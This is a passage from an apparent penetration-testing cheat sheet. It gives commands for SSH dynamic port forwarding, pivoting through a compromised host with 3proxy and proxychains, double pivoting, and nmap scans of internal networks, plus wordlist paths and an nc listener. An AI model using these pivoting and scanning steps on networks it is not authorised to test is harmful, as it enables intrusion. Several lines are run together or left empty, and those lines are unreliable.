ssh <gateway> -R <remote port to bind>:<local host>:<local port>
```

### Dynamic Port Forwarding <a id="dynamic-port-forwarding"></a>

Allows to create a tunnel from the target to your machine, and have the traffic routed to any host through target. You can configure a local port to forward traffic to multiple destinations passing through a single host. It is similar to local port forwarding but allows multiple destinations. It uses the SOCKS protocol. The syntax is:

```text
ssh -D local_port remote_add 
```

The connection of the previous command is established at port 22 of remote addr.

### Pivoting <a id="pivoting"></a>

1. drop 3proxy.exe

2. Set up a config file:

```text
allow *_internal IP_SAME_NETWORKexternal IP_OTHER_NETWORKsocks -p1081
```

3. Add to **/etc/proxychains.conf**:

```text
socks4  IP_SAME_NETWORK 1081
```

4. Scan:

```text
proxychains nmap -sT -Pn IP_OTHER_NETWORK-250 --top-ports=5
```

### Double-pivoting <a id="double-pivoting"></a>

Pivoting through two different networks:

First, create a dynamic port forwarding through the first network:

```text
ssh -f -N -D 9050 root@10.1.2.1
```

Edit **/etc/proxychains.conf** and add as default gateway:

Use the proxy to create a second dynamic port forward to the second network:

```text
proxychains ssh -f -N -D 10050 root@10.1.2.1 -p 22
```

Edit again **/etc/proxychains.conf** and add as default gateway:

* You can now use proxychains to pivot to the target network:

  ```text
  proxychains nmap -sTV -n -PN 10.1.2.1 -254
  ```

## CVEs <a id="cves"></a>

* ```text
  http://www.cvedetails.com/https://www.exploit-db.com/
  ```

## Word Lists <a id="word-lists"></a>

* ```text
  /usr/share/seclists//usr/share/wordlist//usr/share/metasploit-framework/data/wordlists/
  ```

Minimal web server

* ```text
  for i in 1 2 3 4 5 6 7; do echo -e '200 OK HTTP/1.1\r\nConnection:close\r\n\r\nfoo\r\n' |nc -q 0 -klvvp 80; done
  ```

## ​ <a id="undefined"></a>

## Proxy <a id="proxy"></a>

Protocols

```text
http://http://connect://sock4://sock5://
```

